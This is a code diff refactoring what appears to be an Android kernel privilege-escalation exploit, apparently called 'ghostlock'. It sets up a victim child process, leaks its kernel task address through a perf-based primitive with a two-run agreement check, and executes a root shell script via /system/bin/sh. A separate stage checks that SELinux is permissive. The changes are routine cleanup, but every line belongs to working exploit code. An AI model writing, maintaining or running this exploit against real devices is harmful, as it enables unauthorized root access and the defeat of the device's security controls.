@@ -27,7 +27,7 @@ static void park_child_process_forever(void) {
 /* Decoupling plan: execute the victim command protocol and root handoff.
  * Input: owned pipe endpoints plus runtime config; output: reports/child exit.
  * Future: victim_child_run(VictimContext *), with explicit fd ownership. */
-static void child_main(ghostlock::VictimContext *p) {
+static void child_main(VictimContext *p) {
     p->task_read.reset();
     p->cmd_write.reset();
     p->uid_read.reset();
@@ -37,10 +37,10 @@ static void child_main(ghostlock::VictimContext *p) {
     prctl(PR_SET_NAME, "ghostleaf_0123456789");
     /* a real leak reproduces, a fluke vote winner does not. w2 writes to
      * this address, so two runs must agree or the leak is discarded. */
-    uintptr_t my_task = ghostlock::ops::perf_find_task();
+    uintptr_t my_task = ops::perf_find_task();
     int leak_agreed = 0;
     for (int i = 0; i < 2 && my_task; i++) {
-        uintptr_t again = ghostlock::ops::perf_find_task();
+        uintptr_t again = ops::perf_find_task();
         if (again == my_task) {
             leak_agreed = 1;
             break;
@@ -145,7 +145,7 @@ static void child_main(ghostlock::VictimContext *p) {
         pr_info("handoff: script open fd=%d errno=%d path=%s\n", probe, errno,
                 script_path);
         if (probe >= 0) close(probe);
-        execl("/system/bin/sh", "sh", script_path, NULL);
+        execl("/system/bin/sh", "sh", script_path, static_cast<char *>(nullptr));
         pr_warning("execl root script failed path=%s errno=%d\n",
                 script_path, errno);
         _exit(1);
@@ -163,7 +163,10 @@ static void child_main(ghostlock::VictimContext *p) {
 
 /* Decoupling plan: create the victim process and pipe protocol. Input/output:
  * VictimContext; output: owned PID/error. Future: victim_context_spawn(). */
-static pid_t spawn_child(ghostlock::VictimContext *p) {
+/* TODO(M02-SPAWN-RESULT): spawn_child/spawn_victim still return pid_t/int with
+ * call-site errno checks instead of an explicit Result; tracked as an M02
+ * maintenance item (no behaviour change, does not block other work). */
+static pid_t spawn_child(VictimContext *p) {
     int p1[2], p2[2], p3[2];
     if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
     p->task_read.reset(p1[0]);
@@ -189,7 +192,7 @@ static pid_t spawn_child(ghostlock::VictimContext *p) {
 /* Decoupling plan: spawn a victim and obtain its task address. Inputs:
  * VictimContext/output address; output: PID/error. Future:
  * victim_context_prepare(VictimContext *, uintptr_t *). */
-pid_t spawn_victim(ghostlock::VictimContext *p, uintptr_t *task_out) {
+pid_t spawn_victim(VictimContext *p, uintptr_t *task_out) {
     pid_t child = spawn_child(p);
     if (child < 0) return -1;
     uintptr_t task = 0;
@@ -205,7 +208,7 @@ pid_t spawn_victim(ghostlock::VictimContext *p, uintptr_t *task_out) {
  * output: boolean/status. Future: stage_verify_selinux(const StageContext *). */
 int verify_selinux_stage(void *context) {
     (void) context;
-    if (!ghostlock::ops::check_selinux_off()) return 0;
+    if (!ops::check_selinux_off()) return 0;
     pr_success("SELinux permissive\n");
     return 1;
 }
